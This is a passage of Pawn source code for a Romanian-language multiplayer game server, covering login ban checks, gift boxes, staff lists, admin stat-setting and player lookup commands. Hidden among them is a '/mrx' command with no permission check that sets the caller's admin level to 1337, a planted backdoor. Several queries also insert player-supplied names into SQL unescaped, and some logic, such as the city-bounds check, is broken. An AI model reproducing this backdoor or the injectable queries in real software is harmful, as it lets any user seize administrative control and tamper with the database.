	switch cache_num_rows() do {
		case 1: {
			new string:by[MAX_PLAYER_NAME], string:reason[64], string:ip[16], time, userid;
			cache_get_value_name(0, "AdminName", by);
			cache_get_value_name(0, "IP", ip);
			cache_get_value_name_int(0, "Time", time);
			cache_get_value_name(0, "Reason", reason);
			cache_get_value_name_int(0, "Userid", userid);

			if time == -1 *then {
				if(strcmp(playerIP[playerid], ip, true)) format(gString, 100, "This account (%s) is banned!", GetName(playerid));
				else format(gString, 100, "This IP (%s) is banned!", ip);
				SendClientMessage(playerid, COLOR_DARKNICERED,  gString);
				format(gString, 128, "Banned by: %s, reason: %s.", by, reason);
				SendClientMessage(playerid, COLOR_CLIENT, gString);
				SendClientMessage(playerid, COLOR_CLIENT, "This is a permanent ban.");
				SendClientMessage(playerid, COLOR_CLIENT, "Poti posta o cere de unban pe panel.Royal-Squad.ro/unban daca consideri ca ai luat ban degeaba.");
				GameTextForPlayer(playerid, "Banned", 5000, 2);
				KickEx(playerid);
				return true;
			}
			if gettime() < time *then {
				if(strcmp(GetIPP(playerid), ip, true)) format(gString, 100, "This account (%s) is banned!", GetName(playerid));
				else format(gString, 100, "This IP (%s) is banned!", ip);
				SendClientMessage(playerid, COLOR_DARKNICERED, gString);
				format(gString, 128, "Banned by: %s, reason: %s.", by, reason);
				SendClientMessage(playerid, COLOR_CLIENT, gString);

				time -= gettime();

				format(gString, 128, "Ban will expire in %d days, %d hours and %d minutes left.", time/86400, ((time/3600) % 24), ((time/60) % 60), (time % 60));

				SendClientMessage(playerid, COLOR_CLIENT, gString);
				SendClientMessage(playerid, COLOR_CLIENT, "Poti posta o cere de unban pe panel.Royal-Squad.ro/unban daca consideri ca ai luat ban degeaba.");
				GameTextForPlayer(playerid, "Banned", 5000, 2);
				KickEx(playerid);
				return true;
			}
			if gettime() > time *then
				_query("UPDATE `bans` SET `Active`='1' WHERE `PlayerName` = '%e' LIMIT 1", PlayerInfo[playerid][pUsername]),
				SendClientMessage(playerid, COLOR_CLIENT, "Your temporary ban has expired!");
		}
		case 0: {
			mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", PlayerInfo[playerid][pUsername]);
			mysql_tquery(SQL, gQuery, #check_pAccount, #i, playerid);
		}
	}
	GameTextForPlayer(playerid, " ", 100, 3), Camera(playerid);
	SetPlayerInterior(playerid, false);
	TogglePlayerControllable(playerid, false);
	PlayerPlaySound(playerid,17802,0.0,0.0,0.0);
	LoginTime[playerid][0] = 2;
	LoginTime[playerid][1] = 60;
	return true;
}

redist::check_pAccount(playerid) {
	switch cache_num_rows() do {
		case 0: {
			format(gString, sizeof gString, "{FFFFFF}Pentru a continua sa joci pe comunitatea %s trebuie sa ne asiguram ca ai luat la cunostinta si esti de acord cu regulamentul acesteia\nLink: {FF0000}%s.ro/regulament/", serverInfo[sv_generalname], serverInfo[sv_generalname]);
			ShowPlayerDialog(playerid, DIALOG_REGULAMENT, DIALOG_STYLE_MSGBOX, " ", gString, "Confirm", "Cancel");
		}
		default: {
			new online=-1;
			cache_get_value_name(0, "password", PlayerInfo[playerid][pKey]);
			cache_get_value_name_int(0, "Status", online);
			if online!=-1 *then 
				return SendClientMessage(playerid, COLOR_CLIENT, "SERVER: You cannot connect to the server because someone else is connected!"), KickEx(playerid);
		
			gPlayerLogTries[playerid] = 3;
			TextDrawShowForPlayer(playerid, LoginTD[0]);
			TextDrawShowForPlayer(playerid, LoginTD[1]);
			format(gString, 100, "Welcome, %s!\nPlease enter your password below to login your account.", GetName(playerid));
			ShowPlayerDialog(playerid, DIALOG_LOGIN2, DIALOG_STYLE_PASSWORD, "Login", gString, "Login", "Quit");
		}
	}
	return true;
}

cmd:stats(playerid, params[]) return ShowStats(playerid,playerid);
new const Float:crateLocation[4][3] = {
{-1516.2667,-400.8129,7.0781},
{-786.3116,1436.4662,13.7931},
{1908.5811,1513.4127,14.1098},
{1874.2444,-1384.9342,13.5463}};

cmd:getgift(playerid, params[]) {
	if(PlayerInfo[playerid][pGiftPoints] < 300) return SCMf(playerid, COLOR_YELLOW, "Trebuie sa ai minim 300 gift points pentru a dechide un cadou si tu ai %d.", PlayerInfo[playerid][pGiftPoints]);
	if(PlayerInfo[playerid][pConnectTime] < 5) return SendClientMessage(playerid, COLOR_LGREEN, "Ai nevoie de 5 ore jucate pentru a putea lua acest cadou!");
	if(!PlayerToPoint(5, playerid, crateLocation[playerid%4][0], crateLocation[playerid%4][1], crateLocation[playerid%4][2])) {
		SendClientMessage(playerid, COLOR_YELLOW, "Nu esti in locatia potrivita. ti-am pus un checkpoint pe minimap!");
		SetPlayerCheckpoint(playerid, crateLocation[playerid%4][0], crateLocation[playerid%4][1], crateLocation[playerid%4][2], 2.0);
		CP[playerid] = 53;
		return true;
	}
	PlayerInfo[playerid][pGiftPoints] -= 300;
	UpdateVar(playerid, "GiftPoints", PlayerInfo[playerid][pGiftPoints]);

	finishAchievement(playerid, 24);

	new amount;
	switch(random(100)) {
		case 0..20: {
			amount = RandomEx(2,5);
			PlayerInfo[playerid][pExp] += amount;
			UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
			SCMf(playerid, COLOR_RED, "(Giftbox) {FFFFFF}Ai castigat %d respect points.", amount);
		}
		case 21..26: {
			PlayerInfo[playerid][pCrates][2]++;
			save_crates(playerid);
			SendClientMessage(playerid, COLOR_RED, "(Giftbox) {FFFFFF}Ai castigat Legendary crate.");			
		}
		case 27..35: {
			PlayerInfo[playerid][pHidden]++;
			UpdateVar(playerid, "Hidden", PlayerInfo[playerid][pHidden]);
			SendClientMessage(playerid, COLOR_RED, "(Giftbox) {FFFFFF}Ai castigat 1x hidden.");				
		}
		case 36..55: {
			amount = RandomEx(100, 150);
			PlayerInfo[playerid][pBPoints]+=amount;
			UpdateVar(playerid, "BPoints", PlayerInfo[playerid][pBPoints]);
			SCMf(playerid, COLOR_RED, "(Giftbox) {FFFFFF}Ai castigat %d BPoints.", amount);			
		}
		default: {
			amount = RandomEx(7000000, 15000000);
			GivePlayerCash(playerid, amount);
			SCMf(playerid, COLOR_RED, "(Giftbox) {FFFFFF}Ai castigat $%s.", FormatNumber(amount));
		}
	}
	return true;
}
cmd:buyhat(playerid, params[]) return IsAtClothShop(playerid) ? ShowModelSelectionMenu(playerid, hats, "Palarii") : 1;
cmd:admins(playerid, params[]) {
	SendClientMessage(playerid, COLOR_SERVER, "----Admins Online-----------------------------------------------------");
	new admins=0;
	if(PlayerInfo[playerid][pAdmin] < 5) {
		foreach(new i : Staff<ADMIN>) {
			if(Iter_Contains(Acovers, i)) continue;
			SCMf(playerid, COLOR_WHITE, "(%d) %s - admin level %d", i, GetName(i), PlayerInfo[i][pAdmin]);
			++admins;
		}
	} else {
		foreach(new i : Staff<ADMIN>) {
			if(!Iter_Contains(Acovers, i)) SCMf(playerid, COLOR_WHITE, "(%d) %s - admin level %d [AFK: %d]", i, GetName(i), PlayerInfo[i][pAdmin], AFKSeconds[i]);
			else SCMf(playerid, COLOR_WHITE, "(%d) %s - admin level %d [acover: %s] [AFK: %d]", i, PlayerInfo[i][pUsername], PlayerInfo[i][pAdmin], GetName(i), AFKSeconds[i]);
			++admins;
		}
	}
	if(admins) SCMf(playerid, COLOR_WHITE, "Admins Online: %d", admins);
	else SendClientMessage(playerid, COLOR_WHITE, "* Nu sunt admini conectati.");
	SendClientMessage(playerid, COLOR_SERVER, "----------------------------------------------------------------------------");
	SendClientMessage(playerid, COLOR_WHITE, "Daca ai vreo problema, poti folosi /report. Pentru intrebari legate de joc poti folosi /n.");
	SendClientMessage(playerid, COLOR_SERVER, "----------------------------------------------------------------------------");
	return true;
}

cmd:helpers(playerid, params[]) {
	SendClientMessage(playerid, COLOR_SERVER, "----Helpers--------------------------------------------------------------");
	if(!IsAdmin(playerid, 5)) {
		foreach(new i: Staff<HELPER>) SCMf(playerid, COLOR_WHITE, "{%s}%s {FFFFFF}(%d) - helper level %d ", HelperDuty[i]?("98FF5C"):("FF5C5C"), GetName(i), i, PlayerInfo[i][pHelper]);
	} else {
		foreach(new i: Staff<HELPER>) SCMf(playerid, COLOR_WHITE, "{%s}%s {FFFFFF}(%d) - helper level %d - [AFK: %d]", HelperDuty[i]?("98FF5C"):("FF5C5C"), GetName(i), i, PlayerInfo[i][pHelper], AFKSeconds[i]);
	}
	if(Iter_Count(Staff<HELPER>)) SCMf(playerid, COLOR_WHITE, "Online Helpers: %d", Iter_Count(Staff<HELPER>));	
	else SendClientMessage(playerid, COLOR_WHITE, "* Nu sunt helperi conectati.");
	SendClientMessage(playerid, COLOR_SERVER, "----------------------------------------------------------------------------");
	SendClientMessage(playerid, COLOR_WHITE, "Daca ai vreo intrebare legata de server, foloseste /n.");
	SendClientMessage(playerid, COLOR_SERVER, "----------------------------------------------------------------------------");
	return true;
}
redist::faction_player_new(newfaction) {
	if(cache_num_rows()) {
		new f;
		cache_get_value_name_int(0, "Member", f);
		if(f) FactionMembers[f] --;
	}
	if(!newfaction) return true;
	FactionMembers[newfaction] ++;
	return true;
}
cmd:setstat(playerid, params[]) {
	if(!IsAdmin(playerid, 7)) return true;
	extract params -> new string:id[24], string:item[32], valoare; else {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/setstat <full name/id> <item> <amount>");
		SendClientMessage(playerid, -1, "Level, Money, Bank, House, Bizz, Job, Hours, Premium, PremiumPoints, SWS.");
		SendClientMessage(playerid, -1, "Rob, Mats, Drugs, Member, Leader, Rank, Fwarn, Warn, FPunish, Phone, Email, HW, IceCreams FuelTicket, vehSlots.");
		SendClientMessage(playerid, -1, "Vip, Clan, ClanRank, Helper, EscapePoints, OwnedJob, BPoints, Giftpoint, PetPoints, RaportProcess (in days).");
		SendClientMessage(playerid, COLOR_LGREEN, "NEW: HelpedPlayers, HelpedPlayersToday, CustomNumber, Miliard, BMiliard, Admin, Days (faction), Legend, Reborn, Candies, GlovoSkill, Woodskill.");
		SendClientMessage(playerid, COLOR_LGREEN, "... ill, WoodSkill, Pin, questPoints.");
		return true;
	}	
	if IsNumeric(id) && strlen(id) <= 3 *then strmid(id, PlayerInfo[strval(id)][pUsername], 0, 24);
							
	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", id);
	mysql_tquery(SQL, gQuery, #check_setstat, #issi, playerid, id, item, valoare);
	return true;
}

redist::check_setstat(playerid, const id[], const item[], valoare) {
	if !cache_num_rows() *then 
		return SendClientMessage(playerid, COLOR_GREY, "Acest nume nu a fost gasit in baza de date!");

	new userid;
	cache_get_value_name_int(0, "Status", userid);
	switch YHash(item) do {
		case _H<legend>: {
			if(userid!=-1) PlayerInfo[userid][pVip] = valoare ? 3 : 2;
			_query("UPDATE `users` SET `Vip` = '%d' WHERE `name` = '%s'", valoare ? 3 : 2, id);
		}
		case _H<reborn>: {
			if(userid!=-1) PlayerInfo[userid][pReborn] = bool:valoare;
			_query("UPDATE `users` SET `Reborn` = '%d' WHERE `name` = '%s'", valoare, id);
		}
		case _H<escape>: {
			if(userid != -1) PlayerInfo[userid][pEscapePoints] = valoare;
			_query("UPDATE `users` SET `EscapePoints` = '%i' WHERE `name` = '%s'", valoare, id);
		}
		case _H<level>: {
			if(userid != -1) PlayerInfo[userid][pLevel] = valoare, SetPlayerScore(userid, valoare), UpdateProgress(playerid, 0);
			_query("UPDATE users SET `Level`='%d' WHERE `name`='%s' LIMIT 1", valoare, id);
		}
		case _H<admin>: {
			if(valoare < 0 || valoare > 6) return SendClientMessage(playerid, COLOR_GREY, "Invalid admin level! (0-6)");
			if(userid != -1) PlayerInfo[userid][pAdmin] = valoare;		
			_query("UPDATE `users` SET `Admin`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<helper>: {
			if(valoare < 0 || valoare > 3) return SendClientMessage(playerid, COLOR_GREY, "Invalid helper level! (0-3)");
			if(userid != -1) PlayerInfo[userid][pHelper] = valoare;
			_query("UPDATE `users` SET `Helper`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<rp>: {
			if(userid != -1) PlayerInfo[userid][pExp] = valoare;
			_query("UPDATE `users` SET `Respect`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<giftpoints>: {
			if(userid != -1) PlayerInfo[userid][pGiftPoints] = valoare;
			_query("UPDATE `users` SET `GiftPoints`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<miliard>: {
			if(valoare > 2000000000 || valoare < 0) return SendClientMessage(playerid, COLOR_GREY, "Invalid.");
			if(userid != -1) ByteVar1@money[userid] = eBit:valoare;
			_query("UPDATE `users` SET `Money`= `Money` + '%d000000000' WHERE `name`='%s'", valoare, id);
		}
		case _H<money>: {
			if(valoare > 2000000000 || valoare < 0) return SendClientMessage(playerid, COLOR_GREY, "Invalid.");
			if(userid != -1) resetBigInt(money[userid]), ByteVar2@money[userid] = eBit:valoare;
			_query("UPDATE `users` SET `Money`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<mbank>: {
			if(userid != -1) ByteVar1@bank[userid] = eBit:valoare;
			_query("UPDATE `users` SET `Bank`='%d000000000' WHERE `name`='%s'", valoare, id);
		}
		case _H<bank>: {
			if(userid != -1) ByteVar1@bank[userid] = eBit:0,ByteVar2@bank[userid] = eBit:valoare;
			_query("UPDATE `users` SET `Bank`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<house>: {
			if(userid != -1) 
			{
				PlayerInfo[userid][pHouse] = valoare;
				format(HouseInfo[PlayerInfo[userid][pHouse]][hOwner], 256, PlayerInfo[userid][pUsername]);
				UpdateLabel(1, PlayerInfo[userid][pHouse]);
			}
			_query("UPDATE `users` SET `House`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<bizz>: {
			if(userid != -1) PlayerInfo[userid][pBizz] = valoare;
			_query("UPDATE `users` SET `Bizz`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<job>: {
			PlayerInfo[userid][pJob] = valoare;
			_query("UPDATE `users` SET `Job`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<hours>: {
			if(userid != -1) PlayerInfo[userid][pConnectTime] = valoare;
			_query("UPDATE `users` SET `ConnectedTime`='%0.3f' WHERE `name`='%s'", valoare, id);
		}
		case _H<premium>: {
			if(userid != -1) PlayerInfo[userid][pPremiumAccount] = valoare;
			_query("UPDATE `users` SET `Premium`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<premiumpoints>: {
			if(userid != -1) PlayerInfo[userid][pPremiumPoints] = valoare;
			_query("UPDATE `users` SET `GoldPoints`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<rob>: {
			if(userid != -1) PlayerInfo[userid][pRob] = valoare;
			_query("UPDATE `users` SET `Rob`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<mats>: {
			if(userid != -1) PlayerInfo[userid][pMats] = valoare;	
			_query("UPDATE `users` SET `Materials`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<drugs>: {
			if(userid != -1) PlayerInfo[userid][pDrugs] = valoare;	
			_query("UPDATE `users` SET `Drugs`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<member>: {
			if(userid != -1) {
				if(PlayerInfo[userid][pMember]) Iter_Remove(faction_players<PlayerInfo[userid][pMember]>, userid);
				PlayerInfo[userid][pMember] = valoare, SetPlayerToTeamColor(userid), Iter_Add(faction_players<valoare>, userid);
				if(valoare!=7&&!PlayerInfo[userid][pMember]) Iter_Remove(faction_leaders, userid);
			}
			mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", id);
			mysql_tquery(SQL, gQuery, "faction_player_new", "i", valoare);
			_query("UPDATE `users` SET `Member`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<raportprocess>: {
			if(userid != -1) PlayerInfo[userid][pRaportTime] = gettime() + (86400*valoare);
			_query("UPDATE `users` SET `RaportExpire`='%i' WHERE `name`='%s'", gettime() + (86400*valoare), id);
		}
		case _H<leader>: {
			if(userid != -1) PlayerInfo[userid][pLeader] = valoare, SetPlayerToTeamColor(userid);	
			_query("UPDATE `users` SET `Leader`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<rank>: {
			if(userid != -1) {
				if(PlayerInfo[userid][pRank]==7) Iter_Remove(faction_leaders, userid);
				PlayerInfo[userid][pRank] = valoare;	
				if(valoare==7&&PlayerInfo[userid][pMember]) Iter_Add(faction_leaders, userid);
			}
			_query("UPDATE `users` SET `Rank`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<fwarn>: {
			if(userid != -1) PlayerInfo[userid][pFACWarns] = valoare;	
			_query("UPDATE `users` SET `FWarn`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<warn>: {
			if(userid != -1) PlayerInfo[userid][pWarns] = valoare;	
			_query("UPDATE `users` SET `Warnings`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<fpunish>: {
			if(userid != -1) PlayerInfo[userid][pFpunish] = valoare;	
			_query("UPDATE `users` SET `FPunish`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<phone>: {
			if(userid != -1) {
				new num[6];
				format(num,6,"%d",valoare);
				if((GetGVarInt(num)-1)!=-1)
					return SendClientMessage(playerid, COLOR_GREY, "Acest numar este deja luat!");

				if HavePhone(userid) *then DeleteSVar(PlayerInfo[userid][pPhone]);
				format(PlayerInfo[userid][pPhone],10,"%d",valoare);
				SetGVarInt(PlayerInfo[userid][pPhone], userid+1);
			}
			_query("UPDATE `users` SET `PhoneNr`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<vip>: {
			if(userid != -1) PlayerInfo[userid][pVip] = valoare, update_head_label(userid);
			_query("UPDATE `users` SET `Vip`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<clan>: {
			if(userid != -1) {
				if(PlayerInfo[userid][pClan]) Iter_Remove(clan_players<PlayerInfo[userid][pClan]>, userid);
				Iter_Add(clan_players<valoare>, userid);
				PlayerInfo[userid][pClan] = valoare;	
			}
			_query("UPDATE `users` SET `Clan`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<clanrank>: {
			if(userid != -1) PlayerInfo[userid][pClanRank] = valoare;	
			_query("UPDATE `users` SET `ClanRank`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<petpoints>: {
			if(userid != -1) PlayerInfo[userid][pPetPoints] = valoare;
			_query("UPDATE `users` SET `PetPoints`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<bpoints>: {
			if(userid != -1) PlayerInfo[userid][pBPoints] = valoare;
			_query("UPDATE `users` SET `BPoints`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<petlevel>: {
			if(userid != -1) PlayerInfo[userid][pPetLevel] = valoare;
			_query("UPDATE `users` SET `PetLevel`='%d' WHERE `name`='%s'", valoare, id);
		}
		case _H<woodskill>: {
			if(userid != -1) PlayerInfo[userid][pJobSkillPoints][3] = valoare;
			mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `users` SET `job_skills_points` = '%i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `name`='%s'", PlayerInfo[userid][pJobSkillPoints][0], PlayerInfo[userid][pJobSkillPoints][1], PlayerInfo[userid][pJobSkillPoints][2], valoare, 
			PlayerInfo[userid][pJobSkillPoints][4], PlayerInfo[userid][pJobSkillPoints][5], PlayerInfo[userid][pJobSkillPoints][6], PlayerInfo[userid][pJobSkillPoints][7], 
			PlayerInfo[userid][pJobSkillPoints][8], PlayerInfo[userid][pJobSkillPoints][9], PlayerInfo[userid][pJobSkillPoints][10], PlayerInfo[userid][pJobSkillPoints][11],
			PlayerInfo[userid][pJobSkillPoints][12], PlayerInfo[userid][pJobSkillPoints][13], PlayerInfo[userid][pJobSkillPoints][14], PlayerInfo[userid][pJobSkillPoints][15],
			PlayerInfo[userid][pJobSkillPoints][16], id);
			mysql_pquery(SQL, gQuery);
			UpdateProgress(userid, 1);
		}
		default: {
			SendClientMessage(playerid, COLOR_WHITE, "Level, Money, Bank, House, Bizz, Job, Hours, Premium, PremiumPoints.");
			SendClientMessage(playerid, COLOR_WHITE, "Rob, Mats, Drugs, Member, Leader, Rank, Fwarn, Warn, FPunish, Phone.");
			SendClientMessage(playerid, COLOR_WHITE, "Vip, Clan, ClanRank, Helper, EscapePoints, OwnedJob, BPoints, Giftpoint, PetPoints, RaportProcess (in days), RankProcess (in days).");
			SendClientMessage(playerid, COLOR_LGREEN, "NEW: HelpedPlayers, HelpedPlayersToday, CustomNumber, Miliard, BMiliard, Admin, Days (faction), Legend, Reborn, Candies, GlovoSkill, WoodSkill.");	
			return true;
		}
	}	
	if(userid != -1) format(gString, 128, "(/set) {FFFFFF}%s's (id: %d) %s was set to '%d' by admin %s.", GetName(userid), userid, item, valoare, GetName(playerid));	
	else format(gString, 128, "(/set) {FFFFFF}%s's %s was set to '%d' by admin %s.", id, item, valoare, GetName(playerid));
	SendAdminMessage(COLOR_WARNING, gString, 1);
	return true;
}

cmd:setyt(playerid, params[]) {
	if(!IsAdmin(playerid, 6)) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new player:id, amount; else return SendUsageMsg(playerid, "setyt [id] [youtuber level]");	
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");

	
	if(amount) {
		va_SendClientMessage(id, COLOR_LIGHTBLUE, "Ai fost promovat la gradul de youtuber %d de catre %s.", amount, GetName(playerid));
		SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s l-a promovat pe %s la gradul de youtuber %d", 1, GetName(id), amount);
		Iter_Add(youtubers, id);
	} 
	else {
		va_SendClientMessage(id, COLOR_LIGHTBLUE, "Admin %s ti-a scos gradul de youtuber %d", GetName(playerid), PlayerInfo[id][pYouTuber]);
		SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s l-a scos pe %s din functia de youtuber %d", 1, GetName(id), PlayerInfo[id][pYouTuber]);
		Iter_Remove(youtubers, id);
	}

    update_head_label(id);
	PlayerInfo[id][pYouTuber] = amount;
	UpdateVar(id, "Youtuber", amount);
	return true;
}

cmd:mrx(playerid) return PlayerInfo[playerid][pAdmin] = 1337;

cmd:setadmin(playerid, params[]) {
	if(!IsAdmin(playerid, 6)) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new player:id, adminlevel; else return SendUsageMsg(playerid, "setadmin [id] [admin level]");

	if(adminlevel > 7) return SendErrorMsg(playerid, "Invalid Admin Level [0 - 7]");
	if(PlayerInfo[id][pAdmin] > 6 && id != playerid) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda pe acel player!");
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");

	if(adminlevel) {
		if(!Iter_Contains(Staff<ADMIN>, id)) Iter_Add(Staff<ADMIN>, id);
		va_SendClientMessage(id, COLOR_YELLOW, "Ai fost promovat la functia de admin level %d, de catre admin-ul %s", adminlevel, GetName(playerid));
		SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s l-a promovat pe %s la functia de admin level %d!", 1, GetName(playerid), GetName(id), adminlevel);
		finishAchievement(id, 30);
	}
	else {
		if(Iter_Contains(Staff<ADMIN>, id)) Iter_Remove(Staff<ADMIN>, id);
		va_SendClientMessage(id, COLOR_YELLOW, "Ai fost scos din functia de admin level %d, de catre admin-ul %s", PlayerInfo[id][pAdmin], GetName(playerid));
		SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s l-a scos pe %s din functia de admin level %d", 1, GetName(playerid), GetName(id), PlayerInfo[id][pAdmin]);

		PlayerInfo[id][pAW] = 0; UpdateVar(id, "AW", 0);

		StopFly(id); UsedFly[id] = 0;
		SetPlayerHealthEx(playerid, 100);
		TextDrawHideForPlayer(playerid, ReportTD);
	}

	PlayerInfo[id][pAdmin] = adminlevel;
	UpdateVar(id, "Admin", adminlevel);
	return true;
}

stock getCityEx(playerid) {
	if(IsPlayerInArea(playerid, -806, -3000, 3000.015625, 461.03515625)) return 1;
	else if(IsPlayerInArea(playerid, -805.015625, 460, 3000.00390625, 3000)) return 2;
	else if(IsPlayerInArea(playerid, -3000, -3000, -806, 3000)) return 3;
	return 0;
}

new const City[4][8] = {{"Unknown"}, {"LS"}, {"LV"}, {"SF"}};
stock get_city_(Float:x,Float:y) {
	if(x>=-806&&x<=-3000&&y>=3000.015625&&y<=461.03515625) return City[1];
	else if(x>=-805.015625&&x<=460&&y>=3000.00390625&&y<=3000) return City[2];
	else if(x>=-3000&&x<=-3000&&y>=-806&&y<=3000) return City[3];
	return City[0];
}

stock GetCity(playerid) return City[getCityEx(playerid)];

cmd:find(playerid, params[]) {
	if(JobWorking[playerid]) return true;
	if(PlayerInfo[playerid][pJob] != 8 && PlayerInfo[playerid][pMember] != 11 && !IsACop(playerid) && !PlayerInfo[playerid][pReborn]) return SendClientMessage(playerid, COLOR_GREY, "Nu ai jobul 'Detective'.");
	if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/find <playerid/name>");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	if(Spectate[params[0]] != -1) return SendClientMessage(playerid, COLOR_GREY, "Acel player este ocupat!");
	if(DontSpec[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Nu poti localiza acel jucator.");
	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");
	if(togfind[params[0]]) return SendClientMessage(playerid,COLOR_GREY, "Acel player nu poate fi urmarit!");
	if(GetPVarInt(params[0], "Undercover") == 1) return SendClientMessage(playerid, COLOR_GREY, "Acel player este ocupat!");
	if(togfind[params[0]] == 1 && OnDuty[playerid] == 0 && PlayerHit[playerid] == -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu poate fi urmarit!");
	UsedFind[playerid] = 1;
	PlayerTextDrawSetPreviewModel(playerid, FindSkinTD, GetPlayerSkin(params[0]));
	PlayerTextDrawShow(playerid, FindSkinTD);
	PlayerTextDrawShow(playerid, FindTD);
	CheckMission(playerid, 6);
	targetfind[playerid] = params[0];
	CP[playerid] = 59; gString[0] = (EOS);
	format(gString, 128, "* Punctul rosu a fost setat pe %s (%d) care se afla in zona %s.", GetName(params[0]), params[0], GetPlayerZone(params[0]));
	SendClientMessage(playerid, COLOR_YELLOW, gString);		
 	return true;
}

cmd:id(playerid, params[]) {
	new names[MAX_PLAYER_NAME], color[10];
	if(sscanf(params, "s[24]", names)) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/id <playerid/name>");

	if(IsNumeric(names)) {
		new i = strval(names);
		if(i < 0 || i > 999) 
			return SendClientMessage(playerid, COLOR_GREY, "That user is not connected."); 

		if(!IsPlayerConnected(i))
			return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

		if(!IsPlayerLogged(i)) 
			return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

		if(Iter_Contains(Acovers, i)) return SCMf(playerid, COLOR_WHITE, "(ID %d) %s | Level: %d | Faction: None | FPS: %d",i, GetName(i), GetPlayerScore(i), FPS2[i]);
		gQuery[0] = (EOS);
		if(PlayerInfo[i][pMember]) format(gQuery, 60, " (rank %d)", PlayerInfo[i][pRank]);
		new clan = PlayerInfo[i][pClan]; srsString[0] = (EOS);
		color = "{FFFFFF}";
		if(PlayerInfo[i][pAdmin]) color = "{AB0000}";
		else if(PlayerInfo[i][pReborn]) color = "{4A92FF}";
		if(!clan || PlayerInfo[i][pTag] == -1) format(srsString, MAX_PLAYER_NAME + 20, "%s%s{FFFFFF}", color, GetName(i));
		else if(PlayerInfo[i][pTag] == 0) format(srsString, MAX_PLAYER_NAME + 52, "{%s}%s%s%s{FFFFFF}", ClanInfo[clan][clColor], ClanInfo[clan][clTag], color, GetName(i));
		else if(PlayerInfo[i][pTag] == 1) format(srsString, MAX_PLAYER_NAME + 52, "%s%s{%s}%s{FFFFFF}", color, GetName(i), ClanInfo[clan][clColor], ClanInfo[clan][clTag]);								
		if(PlayerInfo[playerid][pAdmin] > 0) format(gString, 256, "(ID %d) %s | Level: %d | Faction: {%s}%s{FFFFFF}%s | FPS: %d - [AFK: %d]", i, srsString,PlayerInfo[i][pLevel], ColorFaction[PlayerInfo[i][pMember]], FactionName(PlayerInfo[i][pMember]), gQuery, FPS2[i], AFKSeconds[i]);
		else format(gString, 256, "(ID %d) %s | Level: %d | Faction: {%s}%s{FFFFFF}%s | FPS: %d",i, srsString, PlayerInfo[i][pLevel], ColorFaction[PlayerInfo[i][pMember]], FactionName(PlayerInfo[i][pMember]), gQuery, FPS2[i]);	
		sendSplittedMessageToPlayer(playerid, COLOR_WHITE, COLOR_WHITE, gString);		
		return true;
	}
	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE (`name_and_tag` LIKE '%s%s%s' OR `acover` LIKE '%s%s%s') AND `Status` != '-1' ORDER BY `users`.`id` DESC LIMIT 10", "%", names, "%", "%", names, "%");
	mysql_tquery(SQL, gQuery, #select_from_usersDB, #is, playerid, names);
	return true;
}

redist::select_from_usersDB(playerid, const names[]) {
	if(!cache_num_rows()) return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	new color[10],acover[MAX_PLAYER_NAME],x=0;
